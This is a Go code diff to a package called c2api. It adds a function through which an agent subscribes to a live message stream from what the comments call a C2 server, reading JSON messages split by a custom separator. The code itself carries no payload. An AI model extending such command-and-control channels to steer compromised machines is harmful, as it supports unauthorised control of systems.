@@ -1,10 +1,67 @@
 package c2api
 
 import (
+	"bufio"
 	"bytes"
 	"encoding/json"
+	"io"
 	"net/http"
+	"strings"
+	"time"
 )
+
+const MESSAGE_STREAM_SEPARATOR = "\r\r\r\r\r"
+
+func AgentMessagesSubscribe(agentID string, messageCallback func(message Message), messageDeserializationFailedCallback func(messageBuffer string)) (err error) {
+	req, err := http.NewRequest("GET", *BaseURL+"/v1/messages/live/"+agentID, nil)
+	if err != nil {
+		return err
+	}
+
+	resp, err := c.Do(req)
+	if err != nil {
+		return err
+	}
+
+	defer resp.Body.Close()
+
+	reader := bufio.NewReader(resp.Body)
+	messageBuffer := ""
+
+	specialSuffix := MESSAGE_STREAM_SEPARATOR + "\n"
+
+	for {
+		messageChunk, err := reader.ReadString('\n')
+		if err != nil {
+			if err == io.EOF {
+				time.Sleep(time.Second)
+				break
+			}
+			continue
+		}
+
+		messageBuffer += messageChunk
+
+		if !strings.Contains(messageChunk, specialSuffix) {
+			continue
+		}
+
+		messageBuffer = strings.TrimSuffix(messageBuffer, specialSuffix)
+
+		var message Message
+		if err := json.Unmarshal([]byte(messageBuffer), &message); err != nil {
+			messageDeserializationFailedCallback(messageBuffer)
+			messageBuffer = ""
+			continue
+		}
+
+		messageBuffer = ""
+
+		messageCallback(message)
+	}
+
+	return nil
+}
 
 // FetchMessages will reach out to C2 server and fetch messages.
 func FetchMessages(agentID string) (messages []Message, err error) {
